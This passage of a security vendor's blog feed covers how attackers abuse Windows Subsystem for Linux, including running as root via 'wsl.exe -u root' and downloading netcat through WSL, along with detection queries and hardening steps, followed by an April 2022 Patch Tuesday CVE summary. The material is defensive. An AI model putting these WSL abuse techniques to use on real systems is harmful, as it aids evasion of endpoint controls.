/><figcaption>Fig.5 WSL enabled</figcaption></figure>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29863" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-6" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-6.png" data-orig-size="1269,748" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-6" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-6-300x177.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-6-1070x631.png" loading="lazy" width="1269" height="748" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-6.png" alt="" class="wp-image-29863" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-6.png 1269w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-6-300x177.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-6-1070x631.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-6-768x453.png 768w" sizes="(max-width: 1269px) 100vw, 1269px" /><figcaption>Fig.6 WSL used to download netcat.</figcaption></figure>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29864" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-7" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-7.png" data-orig-size="1694,871" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-7" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-7-300x154.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-7-1070x550.png" loading="lazy" width="1694" height="871" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-7.png" alt="" class="wp-image-29864" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-7.png 1694w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-7-300x154.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-7-1070x550.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-7-768x395.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-7-1536x790.png 1536w" sizes="(max-width: 1694px) 100vw, 1694px" /><figcaption>Fig.7 WSL Process tree.</figcaption></figure>



<p>Customers can also use Qualys Cyber Security Asset Management (CSAM) to identify all systems in their environment that have WSL enabled by using the query:</p>



<pre class="wp-block-preformatted q-code-highlighted">services:(name:LxssManager)</pre>



<p>The LXSS Manager Service is the service in charge of interacting with the subsystem and can also act as an indicator of its installation (fig 8).</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29865" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-8" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-8.png" data-orig-size="1385,368" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-8" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-8-300x80.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-8-1070x284.png" loading="lazy" width="1385" height="368" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-8.png" alt="" class="wp-image-29865" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-8.png 1385w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-8-300x80.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-8-1070x284.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-8-768x204.png 768w" sizes="(max-width: 1385px) 100vw, 1385px" /><figcaption>Fig.8 Identifying systems with WSL installed.</figcaption></figure>



<h3>System Hardening to Protect Windows Subsystem for Linux</h3>



<p>System administrators can mitigate WSL threats by applying policies against optional features. Virtualization and WSL can be disabled by using the <em>Disable-WindowsOptionalFeature</em> PowerShell cmdlet or the DISM utility. Administrators can also hide the “Turn Windows features on or off” task by setting the <em>NoWindowsFeatures</em> value to 1 in the registry paths:</p>



<pre class="wp-block-preformatted q-code-highlighted">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Programs
and
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Programs </pre>



<p>Logging and auditing of processes via products like EDR can also reduce potential risk.</p>



<h3>Conclusion</h3>



<p>Windows Subsystem for Linux is a beneficial technology that aims to improve productivity by mixing in applications and utilities from different distributions into the Windows experience. However, such a massive undertaking is bound to have some security implications. As adversaries explore WSL to identify newer TTPs, so too must defenders to protect against them.</p>



<p>In this blog post, we examined some elementary threats that WSL brings to an environment. In the next post, we will explore the different binaries that make up WSL and identify potential abuses.</p>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Senior Engineer, Threat Research, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/a5da0efab1b59e29fb9828966a05e5a0?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/apradhan]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>This post is the second of a multi-part blog series that explores and highlights the different risks that Windows Subsystem for Linux (WSL) poses to an enterprise IT environment. Here we examine different TTPs that abuse WSL and assess different methods to defend against such threats.</em></p>



<p><strong><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1">← Go to Part 1</a></strong></p>



<h3>Attack Tactics, Techniques &amp; Procedures Using Windows Subsystem for Linux</h3>



<p>In our <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1">previous blog post</a>, we provided some details about Windows Subsystem for Linux, described our test environment, and detailed how an attacker enables WSL. We then analysed an attack tactic, technique, and procedure (TTP) called Proxying Execution.</p>



<p>Here in Part 2, we will look at additional TTPs as well as various threat hunting and system hardening methods that can help defend your enterprise against these threats.</p>



<h4>TTP #2: Installing Utilities</h4>



<p>Adversaries can bypass the need for a sudo password by passing the argument -u root to wsl.exe. Therefore, installing utilities is a lot easier for them inside WSL. Thus, they can bring down and use any tool of their choice to execute or build their payloads. Additionally, they can add repositories of hacking distributions to bring down tools via the package installer (fig. 1).</p>



<p>Let’s look at one such simple example involving PowerShell.</p>



<p>Interestingly enough, PowerShell can be <a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux?view=powershell-7.1">installed on Linux</a> (fig. 2). Moreover, it will be downloaded from Microsoft’s own repository.</p>



]]></customExcerpt>
    </item>
    <item>
      <title>April 2022 Patch Tuesday: Microsoft Releases 145 Vulnerabilities with 10 Critical; Adobe Releases 4 Advisories, 78 Vulnerabilities with 51 Critical.</title>
      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/04/12/april-2022-patch-tuesday</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/04/12/april-2022-patch-tuesday#respond</comments>
      <dc:creator><![CDATA[Debra M. Fezza Reed]]></dc:creator>
      <pubDate>Tue, 12 Apr 2022 20:07:30 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <category><![CDATA[#unifieddashboard]]></category>
      <category><![CDATA[adobe]]></category>
      <category><![CDATA[dashboard]]></category>
      <category><![CDATA[microsoft]]></category>
      <category><![CDATA[patch management]]></category>
      <category><![CDATA[Patch Tuesday]]></category>
      <category><![CDATA[security]]></category>
      <category><![CDATA[vulnerabilities]]></category>
      <category><![CDATA[vulnerability management]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29819</guid>
      <description><![CDATA[Microsoft Patch Tuesday Summary Microsoft has fixed 145&#160;vulnerabilities, including 17 Microsoft Edge vulnerabilities, in the April 2022 update, with ten (10) classified as Critical as they allow Remote Code Execution (RCE). This month’s Patch Tuesday release includes fixes for two (2) zero-day vulnerabilities as well, one (1) known to be actively exploited (CVE-2022-24521) and the [&#8230;]]]></description>
      <content:encoded><![CDATA[
<h2><strong>Microsoft Patch Tuesday Summary</strong></h2>



<p class="has-text-align-justify">Microsoft has fixed 145&nbsp;vulnerabilities, including 17 Microsoft Edge vulnerabilities, in the April 2022 update, with ten (10) classified as <strong><em>Critical</em></strong> as they allow Remote Code Execution (RCE). This month’s Patch Tuesday release includes fixes for two (2) zero-day vulnerabilities as well, one (1) known to be actively exploited (<a rel="noreferrer noopener" href="http://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-24521" data-type="URL" data-id="http://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-24521" target="_blank">CVE-2022-24521</a>) and the other to be publicly exposed (<a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-26904" target="_blank">CVE-2022-26904</a>).</p>



<p class="has-text-align-justify">Microsoft has fixed several problems in their software, including Denial of Service, Elevation of Privilege, Information Disclosure, Remote Code Execution, and Spoofing vulnerabilities.</p>



<span id="more-29819"></span>



<h2>Notable Microsoft Vulnerabilities Patched</h2>



<p class="has-text-align-justify">This month’s <a href="https://msrc.microsoft.com/update-guide/releaseNote/2022-Apr" data-type="URL" data-id="https://msrc.microsoft.com/update-guide/releaseNote/2022-Apr" target="_blank" rel="noreferrer noopener">advisory</a> covers multiple Microsoft products, including, but not limited to, Azure, Browser (Edge – Chromium), Developer Tools, Extended Security Update (ESU), Microsoft Dynamics, Microsoft Office, SQL Server, System Center, and Windows.</p>



<p></p>



<h3 id="h3"><strong><a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23259" target="_blank">CVE-2022-23259</a> | Microsoft Dynamics 365 (on-premises) Remote Code Execution (RCE) Vulnerability</strong></h3>



<p>This vulnerability has a CVSSv3.1 score of 8.8/10.</p>



<p class="has-text-align-justify">An authenticated user could run a specially crafted trusted solution package to execute arbitrary SQL commands. From there the attacker could escalate and execute commands as db_owner within their Dynamics 356 database.</p>



<p><a rel="noreferrer noopener" href="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" data-type="URL" data-id="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" target="_blank">Exploitability Assessment</a>: <strong><em>Exploitation Less Likely.</em></strong></p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-24491" target="_blank">CVE-2022-24491</a> and <a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-24497" target="_blank">CVE-2022-24497</a> | Windows Network File System Remote Code Execution (RCE) Vulnerability</strong></h3>



<p>This vulnerability has a CVSSv3.1 score of 9.8/10.</p>



<p class="has-text-align-justify">An attacker could send a specially crafted NFS protocol network message to a vulnerable Windows machine, which could enable remote code execution. NOTE: This vulnerability is only exploitable for systems that have the <a href="https://docs.microsoft.com/en-us/windows-server/storage/nfs/nfs-overview" target="_blank" rel="noreferrer noopener">NFS</a> role enabled.</p>



<p><a rel="noreferrer noopener" href="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" data-type="URL" data-id="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" target="_blank">Exploitability Assessment</a>: <strong><em>Exploitation More Likely.</em></strong></p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-24500" target="_blank">CVE-2022-24500</a> | Windows SMB Remote Code Execution (RCE) Vulnerability</strong></h3>



<p>This vulnerability has a CVSSv3.1 score of 8.8/10.</p>



<p class="has-text-align-justify">This vulnerability requires that a user with an affected version of Windows access a malicious server. An attacker would have to host a specially crafted server share or website. An attacker would have no way to force users to visit this specially crafted server share or website, but would have to convince them to visit the server share or website, typically by way of an enticement in an email or chat message. For vulnerability to be exploited, a user would need to access a malicious SMB server to retrieve some data as part of an OS API call. Microsoft offers mitigations for this vulnerability; Block TCP port 445 at the enterprise perimeter firewall, and follow <a href="https://docs.microsoft.com/windows-server/storage/file-server/smb-secure-traffic" target="_blank" rel="noreferrer noopener">Microsoft guidelines to secure SMB traffic</a>.</p>



<p><a rel="noreferrer noopener" href="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" data-type="URL" data-id="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" target="_blank">Exploitability Assessment</a>: <strong><em>Exploitation Less Likely.</em></strong></p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-24541" target="_blank">CVE-2022-24541</a> | Windows Server Service Remote Code Execution (RCE) Vulnerability</strong></h3>



<p>This vulnerability has a CVSSv3.1 score of 8.8/10.</p>



<p class="has-text-align-justify">This vulnerability requires that a user with an affected version of Windows access a malicious server. An attacker would have to host a specially crafted server share or website. An attacker would have no way to force users to visit this specially crafted server share or website, but would have to convince them to visit the server share or website, typically by way of an enticement in an email or chat message. Microsoft offers mitigations for this vulnerability; Block TCP port 445 at the enterprise perimeter firewall, and follow <a href="https://docs.microsoft.com/windows-server/storage/file-server/smb-secure-traffic" target="_blank" rel="noreferrer noopener">Microsoft guidelines to secure SMB traffic</a>.</p>



<p><a href="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" data-type="URL" data-id="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" target="_blank" rel="noreferrer noopener">Exploitability Assessment</a>: <strong><em>Exploitation Less Likely.</em></strong></p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26809" target="_blank">CVE-2022-26809</a> | Remote Procedure Call<a> </a>(RPC) Runtime Remote Code Execution (RCE) Vulnerability</strong></h3>



<p>This vulnerability has a CVSSv3.1 score of 9.8/10.</p>



<p class="has-text-align-justify">To exploit this vulnerability, an attacker would need to send a specially crafted Remote Procedure Call (RPC) to an RPC host. This could result in remote code execution (RCE) on the server-side with the same permissions as the RPC service. Microsoft offers mitigations for this vulnerability; Block TCP port 445 at the enterprise perimeter firewall, and follow <a href="https://docs.microsoft.com/windows-server/storage/file-server/smb-secure-traffic" target="_blank" rel="noreferrer noopener">Microsoft guidelines to secure SMB traffic</a>.</p>



<p><a rel="noreferrer noopener" href="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" data-type="URL" data-id="https://www.microsoft.com/en-us/msrc/exploitability-index?rtc=1" target="_blank">Exploitability Assessment</a>: <strong><em>Exploitation More Likely.</em></strong></p>



<p></p>



<h2>Notable Adobe Vulnerabilities Patched</h2>



<p class="has-text-align-justify">Adobe released four (4) <a rel="noreferrer noopener" href="https://helpx.adobe.com/security/security-bulletin.html" data-type="URL" data-id="https://helpx.adobe.com/security/security-bulletin.html" target="_blank">advisories </a>with updates to fix 78 vulnerabilities affecting Acrobat, Acrobat Reader, Adobe After Effects, Adobe Commerce, Magento Open Source, and Photoshop. Of these 78 vulnerabilities, 51 are rated as <strong><em>Critical</em></strong>.</p>



<p></p>



<h3><strong><a href="https://helpx.adobe.com/security/products/magento/apsb22-13.html" target="_blank" rel="noreferrer noopener">APSB22-13</a> | Security update available for Adobe Commerce</strong></h3>



<p>This update resolves one (1) <strong><em>Critical</em></strong> vulnerability. </p>



<p><em><a href="https://helpx.adobe.com/security/severity-ratings.html" data-type="URL" data-id="https://helpx.adobe.com/security/severity-ratings.html" target="_blank" rel="noreferrer noopener">Adobe Priority</a>: 3</em></p>



<p class="has-text-align-justify">Adobe has released a security update for Adobe Commerce and Magento Open Source. This update resolves a critical Arbitrary code execution vulnerability.  Successful exploitation could lead to arbitrary code execution.   </p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a href="https://helpx.adobe.com/security/products/acrobat/apsb22-16.html" target="_blank" rel="noreferrer noopener">APSB22-16</a> | Security update available for Adobe Acrobat and Reader</strong></h3>



<p class="has-text-align-justify">This update resolves multiple <strong><em>Critical, Important, </em></strong><em>and<strong> Moderate</strong></em> vulnerabilities and addresses 62 CVEs. </p>



<p class="has-text-align-justify"><em><a href="https://helpx.adobe.com/security/severity-ratings.html" data-type="URL" data-id="https://helpx.adobe.com/security/severity-ratings.html" target="_blank" rel="noreferrer noopener">Adobe Priority</a>: 2</em></p>



<p class="has-text-align-justify">Adobe has released security updates for Adobe Acrobat and Reader for Windows and macOS. Successful exploitation could lead to arbitrary code execution, memory leak, security feature bypass, and privilege escalation.    </p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a href="https://helpx.adobe.com/security/products/after_effects/apsb22-19.html" target="_blank" rel="noreferrer noopener">APSB22-19</a></strong> | <strong>Security Updates Available for Adobe After Effects</strong></h3>



<p>This update addresses two (2) <strong><em>Critical </em></strong>security vulnerabilities.  </p>



<p><em><a href="https://helpx.adobe.com/security/severity-ratings.html" data-type="URL" data-id="https://helpx.adobe.com/security/severity-ratings.html" target="_blank" rel="noreferrer noopener">Adobe Priority</a>: 3</em></p>



<p class="has-text-align-justify">Adobe has released an update for Adobe After Effects for Windows and macOS.  Successful exploitation could lead to arbitrary code execution in the context of the current user.  </p>



<hr class="wp-block-separator is-style-dots" />



<h3><strong><a href="https://helpx.adobe.com/security/products/photoshop/apsb22-20.html" target="_blank" rel="noreferrer noopener">APSB22-20</a> |</strong> <strong>Security update available for Adobe Photoshop</strong></h3>



<p>This update addresses 13 <strong><em>Critical</em></strong> security vulnerabilities.  </p>



<p><em><a href="https://helpx.adobe.com/security/severity-ratings.html" data-type="URL" data-id="https://helpx.adobe.com/security/severity-ratings.html" target="_blank" rel="noreferrer noopener">Adobe Priority</a>: 3</em></p>



<p class="has-text-align-justify">Adobe has released an update for Photoshop for Windows and macOS. Successful exploitation could lead to arbitrary code execution.</p>



<p></p>



<h2>About Qualys Patch Tuesday</h2>



<p class="has-text-align-justify">Qualys Patch Tuesday QIDs are published as <a href="https://www.qualys.com/research/security-alerts/">Security Alerts</a> typically late in the evening on the day of <a href="https://blog.qualys.com/tag/patch-tuesday">Patch Tuesday</a> followed later by the publication of the monthly queries for the <a href="https://success.qualys.com/discussions/s/article/000006821">Unified Dashboard: 2022 Patch Tuesday (QID Based) Dashboard</a> by Noon on Wednesday.</p>



<p></p>



<h2>Discover and Prioritize Vulnerabilities in <a href="https://www.qualys.com/apps/vulnerability-management-detection-response/">Vulnerability Management Detection Response (VMDR)</a>&nbsp;</h2>



<p>Qualys VMDR automatically detects new Patch Tuesday vulnerabilities using continuous updates to its Knowledge Base (KB).&nbsp;</p>



<p>You can see all your impacted hosts by these vulnerabilities using the following QQL query:</p>



<p><code>vulnerabilities.vulnerability:( qid:<code>91879</code> OR qid:<code>91880</code> OR qid:<code>91881</code> OR qid:<code>91882</code> OR qid:<code>91883</code> OR qid:<code>91884</code> OR qid:<code>91885</code> OR qid:<code>91886</code> OR qid:<code>91889</code> OR qid:<code>91890</code> OR qid:<code>110404</code> OR qid:<code>110405</code> OR qid:<code>110406</code> OR qid:<code>376535</code> )</code></p>



<figure class="wp-block-image alignwide size-large is-style-default"><img data-attachment-id="29842" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/12/april-2022-patch-tuesday/attachment/vmdr-april2022-1" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/VMDR-April2022-1.png" data-orig-size="1920,880" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="VMDR-April2022-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/VMDR-April2022-1-300x138.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/VMDR-April2022-1-1070x490.png" loading="lazy" width="1070" height="490" src="https://blog.qualys.com/wp-content/uploads/2022/04/VMDR-April2022-1-1070x490.png" alt="" class="wp-image-29842" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/VMDR-April2022-1-1070x490.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/VMDR-April2022-1-300x138.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/VMDR-April2022-1-768x352.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/VMDR-April2022-1-1536x704.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/VMDR-April2022-1.png 1920w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<hr class="wp-block-separator is-style-dots" />



<h2>Rapid Response with <a href="https://www.qualys.com/apps/patch-management/">Patch Management (PM)</a></h2>



<p>VMDR rapidly remediates Windows hosts by deploying the most relevant and applicable per-technology version patches. You can simply select respective QIDs in the Patch Catalog and filter on the “Missing” patches to identify and deploy the applicable, available patches in one go.</p>



<p>The following QQL will return the missing patches pertaining to this Patch Tuesday:</p>



<p><code>( qid:<code>91879</code> OR qid:<code>91880</code> OR qid:<code>91881</code> OR qid:<code>91882</code> OR qid:<code>91883</code> OR qid:<code>91884</code> OR qid:<code>91885</code> OR qid:<code>91886</code> OR qid:<code>91889</code> OR qid:<code>91890</code> OR qid:<code>110404</code> OR qid:<code>110405</code> OR qid:<code>110406</code> OR qid:<code>376535</code> )</code></p>



<figure class="wp-block-image alignwide size-large is-style-default"><img data-attachment-id="29843" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/12/april-2022-patch-tuesday/attachment/patch-april2022-1" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/PATCH-April2022-1.png" data-orig-size="1920,875" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="PATCH-April2022-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/PATCH-April2022-1-300x137.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/PATCH-April2022-1-1070x488.png" loading="lazy" width="1070" height="488" src="https://blog.qualys.com/wp-content/uploads/2022/04/PATCH-April2022-1-1070x488.png" alt="" class="wp-image-29843" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/PATCH-April2022-1-1070x488.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/PATCH-April2022-1-300x137.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/PATCH-April2022-1-768x350.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/PATCH-April2022-1-1536x700.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/PATCH-April2022-1.png 1920w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<hr class="wp-block-separator is-style-dots" />



<h2>Monthly Webinar Series: This Month in Vulnerabilities &amp; Patches&nbsp;</h2>



<figure class="wp-block-image size-large"><img data-attachment-id="29629" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/08/march-2022-patch-tuesday/attachment/image-34" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/image.jpeg" data-orig-size="1100,576" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/image-300x157.jpeg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/image-1070x560.jpeg" loading="lazy" width="1070" height="560" src="https://blog.qualys.com/wp-content/uploads/2022/03/image-1070x560.jpeg" alt="" class="wp-image-29629" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image-1070x560.jpeg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image-300x157.jpeg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image-768x402.jpeg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image.jpeg 1100w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p class="has-text-align-justify">The Qualys Research team hosts a monthly webinar series to help our existing customers leverage the seamless integration between Qualys<a rel="noreferrer noopener" href="https://www.qualys.com/apps/vulnerability-management-detection-response/" data-type="URL" data-id="https://www.qualys.com/apps/vulnerability-management-detection-response/" target="_blank"> Vulnerability Management Detection Response (VMDR)</a> and <a rel="noreferrer noopener" href="https://www.qualys.com/apps/patch-management/" data-type="URL" data-id="https://www.qualys.com/apps/patch-management/" target="_blank">Patch Management (PM)</a>. Combining these two solutions can reduce the median time to remediate critical vulnerabilities.&nbsp;</p>



<p class="has-text-align-justify">During the webcast, we will discuss this month’s high-impact vulnerabilities, including those that are part of this month&#8217;s Patch Tuesday alert. We will walk you through the necessary steps to address the key vulnerabilities using Qualys VMDR and Patch Management.&nbsp;</p>



<hr class="wp-block-separator is-style-wide" />



<h3 class="has-text-align-center"><strong><strong><strong>Join the webinar</strong></strong></strong></h3>



<h2 class="has-text-align-center"><strong><strong><strong>This Month in Vulnerabilities &amp; Patches</strong></strong></strong></h2>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em;text-align: center"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://gateway.on24.com/wcc/eh/3347108/category/97049/patch-tuesday" style="background-color:#ed2e26">Register Now</a></div>



<p></p>



<p></p>



<p></p>



<h2>Contributor</h2>



